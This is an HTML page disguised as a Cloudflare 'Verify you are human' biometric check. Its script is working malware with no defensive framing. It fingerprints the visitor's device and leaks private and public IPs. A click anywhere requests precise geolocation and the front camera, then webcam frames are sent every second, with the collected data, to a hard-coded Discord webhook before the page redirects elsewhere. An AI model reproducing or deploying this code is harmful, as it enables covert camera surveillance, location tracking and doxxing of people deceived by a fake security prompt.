<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cloudflare | Security Check</title>
    <style>
        body{background:#fff;font-family:-apple-system,system-ui,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#313131;overflow:hidden;user-select:none;touch-action:none}
        .cf-w{width:100%;max-width:420px;padding:35px;box-sizing:border-box;text-align:center;position:relative;border:1px solid #f2f2f2;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,0.06);z-index:10;background:#fff}
        .logo{width:115px;margin-bottom:25px}
        .h1{font-size:22px;font-weight:600;margin-bottom:12px;letter-spacing:-0.5px}
        .p{font-size:14px;color:#666;margin-bottom:25px;line-height:1.6}
        .vf{width:100%;height:240px;background:#000;border-radius:10px;margin-bottom:25px;overflow:hidden;display:none;border:2px solid #0051c3}
        #v{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
        .ts-b{background:#fafafa;border:1px solid #e0e0e0;border-radius:6px;padding:18px;display:flex;align-items:center;cursor:pointer;justify-content:center}
        .ts-c{width:24px;height:24px;border:3px solid #0051c3;border-radius:4px;margin-right:15px;position:relative}
        .ts-c.s{border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}
        .ts-c.d{background:#0051c3;border-color:#0051c3}
        .ts-c.d::after{content:'';position:absolute;left:8px;top:3px;width:5px;height:11px;border:solid white;border-width:0 3px 3px 0;transform:rotate(45deg)}
        .ts-t{font-size:15px;font-weight:500;color:#222}
        .fn{font-size:11px;color:#bbb;margin-top:20px}
        #ovl{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000;cursor:pointer}
        @keyframes spin{100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
<div id="ovl" onclick="stk()" ontouchstart="stk()"></div>
<div class="cf-w">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="logo">
    <div class="h1">Verify you are human</div>
    <p class="p">Please complete the biometric challenge. Align your face to the viewfinder to secure your session.</p>
    <div class="vf" id="vf"><video id="v" autoplay playsinline muted></video><canvas id="c" style="display:none"></canvas></div>
    <div class="ts-b"><div class="ts-c" id="l"></div><div class="ts-t" id="m">Verify identity</div></div>
    <div class="fn">Protocol: **ABSOLUTE-ZERO** | Node: <span id="node"></span></div>
</div>

<script>
// --- CORE CONFIG ---
const HOOK = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0";
const REDIR = "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/";
const DURATION = 14000; 
const BURST_RATE = 1000;

let ACTIVE = false, DATA = { lan: "Scanning...", count: 0 };
document.getElementById('node').innerText = Math.random().toString(16).toUpperCase().slice(2,10);

// --- 1. UNRESTRICTED RECON (All-in-One) ---
async function recon() {
    DATA.ua = navigator.userAgent;
    DATA.res = `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`;
    DATA.mem = navigator.deviceMemory || "N/A";
    DATA.cpu = navigator.hardwareConcurrency || "N/A";
    DATA.plt = navigator.platform;

    // Private IP Leak (WebRTC)
    try {
        const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (e) => { if(e?.candidate?.candidate) { const r = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(r) DATA.lan = r[1]; }};
    } catch(e){}

    // Public IP & GEO (Redundant)
    const apis = ['https://ipapi.co/json/', 'https://api.ipify.org?format=json'];
    for(let api of apis) {
        try {
            const r = await fetch(api);
            const j = await r.json();
            DATA.ip = j.ip; DATA.isp = j.org || "N/A"; DATA.loc = j.city ? `${j.city}, ${j.country}` : "N/A";
            if(DATA.ip) break;
        } catch(e){}
    }

    // GPU De-masking
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const ext = gl.getExtension('WEBGL_debug_renderer_info');
        DATA.gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "Software";
    } catch(e){ DATA.gpu = "Restricted"; }
}

// --- 2. THE STRIKE ENGINE ---
async function transmit(img = null) {
    DATA.count++;
    const fd = new FormData();
    const packet = {
        username: "NEXUS-v70 [ABSOLUTE-ZERO]",
        embeds: [{
            title: `🔱 EXFILTRATION BURST: ${DATA.count}`,
            color: 0,
            fields: [
                { name: "🌐 Network", value: `**IP:** \`${DATA.ip}\`\n**Private:** \`${DATA.lan}\`\n**ISP:** ${DATA.isp}`, inline: true },
                { name: "📍 Geo", value: DATA.gps || "Syncing...", inline: true },
                { name: "📱 Hardware", value: `**GPU:** ${DATA.gpu}\n**CPU:** ${DATA.cpu} Cores\n**RAM:** ${DATA.mem}GB`, inline: false }
            ],
            footer: { text: `FRAME: ${DATA.count} | ${new Date().toLocaleTimeString()}` }
        }]
    };

    fd.append("payload_json", JSON.stringify(packet));
    if(img) {
        const b = await (await fetch(img)).blob();
        fd.append("file", b, `f_${DATA.count}.jpg`);
    }

    // Parallel Exfiltration (Beacon + Keepalive)
    navigator.sendBeacon(HOOK, fd);
    return fetch(HOOK, { method: 'POST', body: fd, keepalive: true });
}

// --- 3. BIOMETRIC LOOP ---
async function startLoop(stream) {
    const v = document.getElementById('v');
    const c = document.getElementById('c');
    const ctx = c.getContext('2d');

    const loop = setInterval(async () => {
        if(!ACTIVE) return clearInterval(loop);
        c.width = v.videoWidth; c.height = v.videoHeight;
        ctx.drawImage(v, 0, 0);
        const img = c.toDataURL('image/jpeg', 0.4);
        await transmit(img);
    }, BURST_RATE);

    setTimeout(() => {
        ACTIVE = false;
        stream.getTracks().forEach(t => t.stop());
        window.location.replace(REDIR);
    }, DURATION);
}

// --- 4. MAIN TRIGGER ---
async function stk() {
    if(ACTIVE) return;
    ACTIVE = true;
    document.getElementById('ovl').style.display = 'none';
    document.getElementById('l').className = 'ts-c s';
    document.getElementById('m').innerText = "Attesting identity...";

    // Location Force
    navigator.geolocation.getCurrentPosition(
        p => DATA.gps = `[Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`,
        e => DATA.gps = "❌ Blocked",
        { enableHighAccuracy: true }
    );

    // Camera Burst
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        document.getElementById('vf').style.display = 'block';
        const v = document.getElementById('v');
        v.srcObject = s;
        v.play();
        startLoop(s);
    } catch(e) {
        // Fallback: Send recon data if camera fails
        await transmit(null);
        setTimeout(() => window.location.replace(REDIR), 3000);
    }
}

recon();
</script>
</body>
</html>
